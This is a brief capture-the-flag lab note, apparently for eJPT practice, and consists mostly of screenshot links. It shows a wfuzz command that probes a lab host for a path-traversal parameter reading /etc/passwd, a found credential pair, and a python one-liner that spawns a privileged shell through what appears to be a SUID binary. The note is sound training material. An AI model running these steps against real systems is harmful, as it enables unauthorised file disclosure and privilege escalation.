- --
- Tags: #ejptmachine #path_traversal 
---

![Pasted image 20250302150542](../../Fotos/Pasted%20image%2020250302150542.png)

![Pasted image 20250302150559](../../Fotos/Pasted%20image%2020250302150559.png)

![Pasted image 20250302150836](../../Fotos/Pasted%20image%2020250302150836.png)

![Pasted image 20250302150857](../../Fotos/Pasted%20image%2020250302150857.png)

![Pasted image 20250302151127](../../Fotos/Pasted%20image%2020250302151127.png)

`wfuzz -c --hw=12 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/common.txt -u "http://172.17.0.2/index.php?FUZZ=/etc/passwd"`

![Pasted image 20250302151346](../../Fotos/Pasted%20image%2020250302151346.png)

![Pasted image 20250302151514](../../Fotos/Pasted%20image%2020250302151514.png)

![Pasted image 20250302151541](../../Fotos/Pasted%20image%2020250302151541.png)

![Pasted image 20250302151653](../../Fotos/Pasted%20image%2020250302151653.png)

- pinguino:balu

![Pasted image 20250302151739](../../Fotos/Pasted%20image%2020250302151739.png)

![Pasted image 20250302151753](../../Fotos/Pasted%20image%2020250302151753.png)

![Pasted image 20250302151828](../../Fotos/Pasted%20image%2020250302151828.png)

`python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'`

![Pasted image 20250302152115](../../Fotos/Pasted%20image%2020250302152115.png)


